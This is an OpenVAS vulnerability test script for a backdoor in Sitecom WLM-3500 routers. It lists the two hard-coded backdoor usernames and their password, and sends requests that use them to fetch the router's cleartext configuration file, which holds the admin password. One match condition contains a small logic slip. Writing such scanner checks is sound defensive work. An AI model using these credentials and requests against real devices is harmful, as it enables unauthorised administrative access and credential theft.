###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sitecom_wlm-3500_backdoor_acc_auth_bypass_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Sitecom WLM-3500 Backdoor Accounts Authentication Bypass vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_insight = "Sitecom WLM-3500 routers contain an undocumented access backdoor that can be
  abused to bypass existing authentication mechanisms.

  These hard-coded accounts are persistently stored inside the device firmware
  image. Despite these users cannot access all the pages of the web interface,
  they can still access page '/romfile.cfg', the (clear-text) configuration file
  of the device that contains, among the other things, also the password for the
  'admin' user; thus, escalating to administrative privileges is trivial.";

tag_impact = "Successful exploitation will let the remote attacker to access the web
  interface of the affected devices using two distinct hard-coded users.
  Impact Level: Application";

tag_affected = "Sitecom WLM-3500, firmware versions < 1.07";
tag_solution = "Upgrade to Sitecom WLM-3500, firmware versions 1.07 or later,
  For updates refer to http://www.sitecom.com/";
tag_summary = "This host is running Sitecom WLM-3500 Router and is prone to authentication
  bypass vulnerability.";

if(description)
{
  script_id(803193);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-18 15:27:50 +0530 (Thu, 18 Apr 2013)");
  script_name("Sitecom WLM-3500 Backdoor Accounts Authentication Bypass vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "
  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/526372");
  script_xref(name : "URL" , value : "http://comments.gmane.org/gmane.comp.security.bugtraq/51700");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/sitecom-wlm-3500-backdoor-accounts");
  script_summary("Check Sitecom WLM-3500 is vulnerable to Authentication Bypass");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "insight" , value : tag_insight);
  }
  exit(0);
}


include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

port = "";
banner= "";
req = "";
buf = "";
cookie= NULL;
userpass64 = "";


## Get HTTP Port
port = get_http_port(default:80);

if(!port){
  port = 80;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if('WWW-Authenticate: Basic realm="ADSL Modem"' >!< banner){
  exit(0);
}

## Request for the restricted file romfile.cfg
url = '/romfile.cfg';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

## Check before authentication bypass
if("401 Unauthorized" >< buf)
{
  ## GET the Cookie
  cookie = eregmatch(pattern:string("Set-Cookie: ([^\r\n ]+)"), string:buf);
  if(cookie[1]== NULL){
    exit(0);
  }

  ## make list of users
  users = make_list("user3", "qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerty"+
                    "uiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopq" +
                    "wertyuiopqwertyuiopqwertyui");

  ## common password for both the users
  pwd = "1234567890123456789012345678901234567890123456789012345678901234567" +
        "8901234567890123456789012345678901234567890123456789012345678";

  ## check for each user
  foreach user (users)
  {
    userpass = user + ":" + pwd;
    userpass64 = base64(str: userpass);

    ## construct the request with username and password
    req = string("GET ",url," HTTP/1.0\r\n",
                 "Host: ", get_host_name(),"\r\n",
                 "Cookie: ", cookie[1],"\r\n",
                 "Authorization: Basic ",userpass64,"\r\n\r\n");

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    ## Confirm the vulnerability and check the content of romfile.cfg
    if("<ROMFILE>" >< buf  && '"Sitecom' >< buf &&
       "USERNAME=" >< buf &&  "PASSWORD=" && buf)
    {
      security_hole(port);
      exit(0);
    }
  }
}
